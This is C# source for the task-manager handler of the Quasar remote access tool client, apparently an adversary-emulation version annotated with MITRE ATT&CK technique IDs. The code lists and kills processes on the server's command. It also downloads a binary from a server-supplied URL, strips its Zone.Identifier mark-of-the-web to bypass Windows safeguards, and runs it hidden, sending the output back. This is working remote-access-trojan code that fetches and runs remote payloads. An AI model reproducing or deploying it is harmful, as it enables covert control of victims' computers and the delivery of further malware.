using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Threading;

namespace Quasar.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with tasks.
    /// </summary>
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly QuasarClient _client;

        private readonly WebClient _webClient;

        public TaskManagerHandler(QuasarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
            {
                if (_webClient.IsBusy)
                    _webClient.CancelAsync();
            }
        }

        public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                             message is DoProcessStart ||
                                                             message is DoProcessEnd;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg:
                    Execute(sender, msg);
                    break;
                case DoProcessStart msg:
                    Execute(sender, msg);
                    break;
                case DoProcessEnd msg:
                    Execute(sender, msg);
                    break;
            }
        }

        /// <summary>
        /// Executes the GetProcesses request for enumerating local processes.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1057: Process Discovery
        /// </remarks>
        private void Execute(ISender client, GetProcesses message)
        {
            Logger.Debug("Handling GetProcesses command.");
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];

            for (int i = 0; i < pList.Length; i++)
            {
                var process = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle
                };
                processes[i] = process;
            }

            client.Send(new GetProcessesResponse { Processes = processes });
        }

        /// <summary>
        /// Download and execute a .exe, or execute a local binary.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1105: Ingress Tool Transfer <br/>
        /// - T1106: Native API
        /// </remarks>
        private void Execute(ISender client, DoProcessStart message)
        {
            Logger.Debug("Handling DoProcessStart command with task ID " + message.TaskId);
            Logger.Debug(String.Format(
                "DoProcessStart details:\n\tPath to execute: {0}\n\tDownload url: {1}\n\tDownload dest: {2}\n\tArgs: {3}\n\tUse shell execute: {4}\n\tCapture output: {5}\n\tNo window: {6}",
                message.FilePath,
                message.DownloadUrl,
                message.DownloadDestPath,
                message.ProcessArgs,
                message.UseShellExecute,
                message.CaptureOutput,
                message.NoWindow
            ));
            if (string.IsNullOrEmpty(message.FilePath))
            {
                // download and then execute
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    string resultMsg = "No download URL or local filepath provided for process execution.";
                    Logger.Error(resultMsg);
                    client.Send(new DoProcessResponse {TaskId = message.TaskId, Action = ProcessAction.Start, Result = false, ResultMsg = resultMsg});
                    return;
                }

                message.FilePath = string.IsNullOrEmpty(message.DownloadDestPath) ? FileHelper.GetTempFilePath(".exe") : message.DownloadDestPath;

                try
                {
                    if (_webClient.IsBusy)
                    {
                        _webClient.CancelAsync();
                        while (_webClient.IsBusy)
                        {
                            Thread.Sleep(50);
                        }
                    }
                    Logger.Debug("Downloading binary from " + message.DownloadUrl + " and saving to " + message.FilePath);
                    _webClient.DownloadFileAsync(new Uri(message.DownloadUrl), message.FilePath, message);
                }
                catch (Exception ex)
                {
                    string resultMsg = "Exception when handling DoProcessStart: " + ex.ToString();
                    Logger.Error(resultMsg);
                    client.Send(new DoProcessResponse {TaskId = message.TaskId, Action = ProcessAction.Start, Result = false, ResultMsg = resultMsg});
                    NativeMethods.DeleteFile(message.FilePath);
                }
            }
            else
            {
                Logger.Debug("Executing local binary " + message.FilePath);
                // execute locally
                ExecuteProcess(message);
            }
        }

        private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            var message = (DoProcessStart) e.UserState;
            if (e.Cancelled)
            {
                NativeMethods.DeleteFile(message.FilePath);
                string resultMsg = "Cannot execute process: Download canceled for " + message.FilePath;
                Logger.Error(resultMsg);
                _client.Send(new DoProcessResponse {TaskId = message.TaskId, Action = ProcessAction.Start, Result = false, ResultMsg = resultMsg});
                return;
            }

            FileHelper.DeleteZoneIdentifier(message.FilePath);
            ExecuteProcess(message);
        }

        /// <summary>
        /// Executes a binary.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1106: Native API
        /// </remarks>
        private void ExecuteProcess(DoProcessStart message)
        {
            if (message.IsUpdate)
            {
                Logger.Debug("Received client update request from server, which is no longer supported.");
                string msg = "Client update no longer supported.";
                _client.Send(new SetStatus { Message = msg });
                _client.Send(new DoProcessResponse {TaskId = message.TaskId, Action = ProcessAction.Start, Result = false, ResultMsg = msg});
            }
            else
            {
                Logger.Debug("Executing process at " + message.FilePath);
                if (message.UseShellExecute && message.CaptureOutput)
                {
                    Logger.Warn("Cannot capture output if UseShellExecute is set to true. Skipping output collection.");
                    message.CaptureOutput = false;
                }
                try
                {
                    Process p = new Process();
                    p.StartInfo.UseShellExecute = message.UseShellExecute;
                    p.StartInfo.FileName = message.FilePath;
                    p.StartInfo.Arguments = message.ProcessArgs;
                    p.StartInfo.RedirectStandardOutput = message.CaptureOutput;
                    p.StartInfo.RedirectStandardError = message.CaptureOutput;
                    p.StartInfo.CreateNoWindow = message.NoWindow;

                    if (message.CaptureOutput)
                    {
                        new Thread(() =>
                        {
                            // Reference: https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.outputdatareceived?view=netframework-4.7.2
                            try
                            {
                                StringBuilder sb_stdout = new StringBuilder();
                                StringBuilder sb_stderr = new StringBuilder();
                                
                                p.OutputDataReceived += new DataReceivedEventHandler((sender, e) =>
                                {
                                    if (!String.IsNullOrEmpty(e.Data))
                                    {
                                        sb_stdout.Append(e.Data + "\n");
                                    }
                                });
                                p.ErrorDataReceived += new DataReceivedEventHandler((sender, e) =>
                                {
                                    if (!String.IsNullOrEmpty(e.Data))
                                    {
                                        sb_stderr.Append(e.Data + "\n");
                                    }
                                });
                                p.Start();
                                Logger.Info(String.Format("Started process {0} with PID {1}", p.ProcessName, p.Id));
                                p.BeginOutputReadLine();
                                p.BeginErrorReadLine();
                                p.WaitForExit();
                                string procName = p.ProcessName;
                                int pid = p.Id;
                                int exitCode = p.ExitCode;
                                p.Close();
                                string stdout = sb_stdout.ToString();
                                string stderr = sb_stderr.ToString();
                                Logger.Info(String.Format(
                                    "Process {0} with PID {1} exited with exit code {2}\nSTDOUT:\n{3}\n\nSTDERR:\n{4}\n", 
                                    procName, 
                                    pid, 
                                    exitCode,
                                    stdout,
                                    stderr
                                ));                                

                                _client.Send(new DoProcessResponse {
                                    TaskId = message.TaskId, 
                                    Action = ProcessAction.Start, 
                                    Result = true, 
                                    PID = pid,
                                    ExitCode = exitCode,
                                    Stdout = stdout,
                                    Stderr = stderr,
                                    WaitedForExit = true
                                });
                                Logger.Debug("Sent successful DoProcessResponse to server.");
                            }
                            catch (Exception ex)
                            {
                                string msg = String.Format("Error waiting for process to finish and grabbing info (task ID {1}): {0}", ex.ToString(), message.TaskId);
                                Logger.Error(msg);
                                _client.Send(new DoProcessResponse { TaskId = message.TaskId, Action = ProcessAction.Start, Result = false, ResultMsg = msg });
                            }
                        }).Start();
                    }
                    else 
                    {
                        p.Start();
                        Logger.Info(String.Format("Started process {0} with PID {1}", p.ProcessName, p.Id));
                        _client.Send(new DoProcessResponse { TaskId = message.TaskId, Action = ProcessAction.Start, Result = true, PID = p.Id });
                        Logger.Debug("Sent successful DoProcessResponse to server.");
                    }
                }
                catch (Exception ex)
                {
                    string msg = "Error executing process: " + ex.ToString();
                    Logger.Error(msg);
                    _client.Send(new DoProcessResponse { TaskId = message.TaskId, Action = ProcessAction.Start, Result = false, ResultMsg = msg });
                }

            }
        }

        /// <summary>
        /// Terminates a given process
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1489: Service Stop
        /// </remarks>
        private void Execute(ISender client, DoProcessEnd message)
        {
            Logger.Debug("Terminating process PID " + message.Pid);
            try
            {
                Process.GetProcessById(message.Pid).Kill();
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
            }
            catch (Exception ex)
            {
                Logger.Error(String.Format("Error terminating process with PID {0}: {1}", message.Pid, ex.ToString()));
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadFileCompleted -= OnDownloadFileCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
